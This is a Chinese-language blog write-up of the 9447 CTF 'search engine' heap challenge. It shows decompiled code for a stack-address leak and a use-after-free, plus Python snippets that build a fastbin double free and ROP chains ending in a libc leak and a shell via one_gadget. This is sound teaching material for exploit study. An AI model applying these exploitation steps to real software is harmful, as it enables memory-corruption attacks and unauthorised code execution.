---
layout: post
title:  "9447 Search Engine Writeup"
img: how-to-start.jpg
tags: [Writeup]
---

## 前言

由於目前看到 heap 題都像看到鬼一樣  
所以開始讀 [how2heap](https://github.com/shellphish/how2heap)  
我偏好看完一種利用方式就找個題目練習 或是自己出  
因此有了這篇 Writeup  

## 題目

檔案在我的 [github](https://github.com/JackGrence/ctf-write-ups/tree/master/practice/9447-search-engine) 裡  
這隻程式可以儲存、尋找、刪除字串  
存字串的時候如果包含空格 例： "deadbeef hihi"  
會被切成兩個部分 "deadbeef", "hihi"  
不過在刪除的時候只要搜尋 "hihi"  
就可以刪掉整個 "deadbeef hihi"  

## Bug

### leak stack address

0x400A40 這個 function 可以 leak stack address

{% highlight c lineos %}
int input_num()
{
  int result; // eax@1
  char *endptr; // [sp+8h] [bp-50h]@1
  char nptr; // [sp+10h] [bp-48h]@1
  __int64 v3; // [sp+48h] [bp-10h]@1

  v3 = *MK_FP(__FS__, 40LL);
  input_sentence((__int64)&nptr, 0x30, 1);
  result = strtol(&nptr, &endptr, 0);
  if ( endptr == &nptr )
  {
    __printf_chk(1LL, "%s is not a valid number\n", &nptr);
    result = input_num();
  }
  *MK_FP(__FS__, 40LL);
  return result;
}
{% endhighlight %}

input_sentence 不會把最後一個 Byte 設為 0  
所以只要塞 0x30 個字到 nptr 就有機會把 stack address 吐出來  

### use-after-free

{% highlight c lineos %}
void search_with_word()
{
  int search_word_size; // ebp@1
  void *malloc_search_word; // r12@2
  sentence_node *sentence_search; // rbx@2
  char v3; // [sp+0h] [bp-38h]@8

  puts("Enter the word size:");
  search_word_size = input_num();
  if ( (unsigned int)(search_word_size - 1) > 0xFFFD )
    put_exit("Invalid size");
  puts("Enter the word:");
  malloc_search_word = malloc(search_word_size);
  input_sentence((__int64)malloc_search_word, search_word_size, 0);
  sentence_search = (sentence_node *)sentence_list;
  if ( sentence_list )
  {
    do
    {
      if ( *(_BYTE *)sentence_search->main_string )
      {
        if ( sentence_search->sub_size == search_word_size
          && !memcmp((const void *)sentence_search->substr,
                     malloc_search_word, search_word_size) )
        {
          __printf_chk(1LL, "Found %d: ", sentence_search->mainstr_size);
          fwrite((const void *)sentence_search->main_string,
                  1uLL, sentence_search->mainstr_size, stdout);
          putchar(10);
          puts("Delete this sentence (y/n)?");
          input_sentence((__int64)&v3, 2, 1);
          if ( v3 == 'y' )
          {
            memset((void *)sentence_search->main_string, 0,
                   sentence_search->mainstr_size);
            free((void *)sentence_search->main_string);
            puts("Deleted!");
          }
        }
      }
      sentence_search = (sentence_node *)sentence_search->next_node;
    }
    while ( sentence_search );
  }
  free(malloc_search_word);
}
{% endhighlight %}

這一段是在做搜尋 然後找到字串後會詢問是否刪除  
sentence_list 會指向 sentence_node  
  
sentence_node 結構大概長這樣：  

{% highlight c lineos %}
00000000 sentence_node   struc ; (sizeof=0x28, mappedto_2)
00000000 substr          dq ?
00000008 sub_size        dd ?
0000000C unknow1         dd ?
00000010 main_string     dq ?
00000018 mainstr_size    dd ?
0000001C unknow2         dd ?
00000020 next_node       dq ?
00000028 sentence_node   ends
{% endhighlight %}

雖然刪除的時候會刪掉字串內容  
但是 sentence_list 不會被清除  
只要想辦法讓他再找到同個字串就可以 double free  
( 其實直接找 '\x00' 就可以了 詳情請[參考這篇](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn230-search/pwn.py#L126) )  
  
另外搜尋字串一開始會 malloc 一個空間出來  
會在函數的尾端 free 掉  
但是並不會清除內容  
所以可以利用它重設 sentence_list 裡的字串值  

## 我的解法

要小心 malloc 出來的 chunk size 不要落在 0x30  
因為會跟 sentence_node 衝到  
所以放出來的 chunk size 我控制在 0x40  
而且在 return address 附近  
0x0000000000000040 這樣的值比較好找 XD  

{% highlight python lineos %}
create_sentence(0x30, '        a')
create_sentence(0x30, 'b')
create_sentence(0x30, 'c')
delete_sentence('b')
delete_sentence('a')
search_sentence(0x30, '        a')
delete_sentence('c')
delete_sentence('a')  # double free!!
{% endhighlight %}

a 字串前面放八個空白是因為 chunk size 0x40 被 free 的時候  
前面八個 Byte 會被拿去用來指向其他一樣大小的 free chunk  
也就是 free chunk 結構裡的 fd  
  
search_sentence 只做查詢的動作 不會刪除東西  
剛好 fastbin 狀態為 HEAD->a->b->TAIL  
所以查詢時調整一下 chunk size 就能拿到 a chunk  
然後把字串塞進去  
因為最後會被 free 掉且不會清除內容  
所以我們的 a 字串的 a 又回來了！  

*Get double free!*  
  
成功寫到 return address 之後  
要先把能寫的 stack 放大  
不然會塞不下 ROP...  

{% highlight python lineos %}
leak += 16 + 6 + 8 * 5  # expand stack address
new_stack = leak + 0x200
buf = '\x00' * 6
buf += flat([pop_rdi, leak, pop_rsi, 0x50, input_sentence])
assert len(buf) <= 0x30, 'buf too long'
create_sentence(0x30, buf)

proc.recvuntil('3: Quit\n')
proc.sendline('3')

buf = flat([pop_rdi, puts_got, puts_plt, pop_rdi, new_stack, pop_rsi,
            0x88, input_sentence, pop_rsp_r13_r14, new_stack])
{% endhighlight %}

leak 在 main function return address 的附近  
用來放我的第一個 ROP ( 第四行 )  
這邊加上偏移後會落在 input_sentence 後面  
然後繼續輸入下一次的 ROP  
  
我利用它本身輸入字串的函數 (0x4009B0)  
把值寫進去  
缺點是 rdx 如果剛好是 0  
只要出現 0x0a 這個 Byte 就會被濾掉  
  
剩下就是 leak libc base address  
跳到 one_gadget 就拿到 shell 了！  
( 我不是在當下解的 所以 libc offset 會不准 )  
  
看到別人的 writeup 之後發現 libc base address  
還可以利用 smallbin 拿到 詳情[請看這裡](https://github.com/pwning/public-writeup/blob/master/9447ctf2015/pwn230-search/pwn.py#L74)  
~~這世界存在著各種奇技淫巧~~  
  
完整的 code 在我的 [github](https://github.com/JackGrence/ctf-write-ups/tree/master/practice/9447-search-engine) 裡
